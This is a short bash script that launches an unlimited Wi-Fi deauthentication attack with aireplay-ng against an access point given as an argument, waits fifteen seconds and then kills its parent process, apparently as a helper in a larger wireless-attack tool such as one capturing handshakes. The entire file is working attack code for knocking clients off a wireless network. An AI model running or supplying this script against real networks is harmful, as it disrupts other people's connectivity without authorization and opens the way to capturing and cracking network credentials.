#!/bin/bash

sleep 2
sudo aireplay-ng --deauth 0 -a $1 $2
sleep 15
kill $PPID
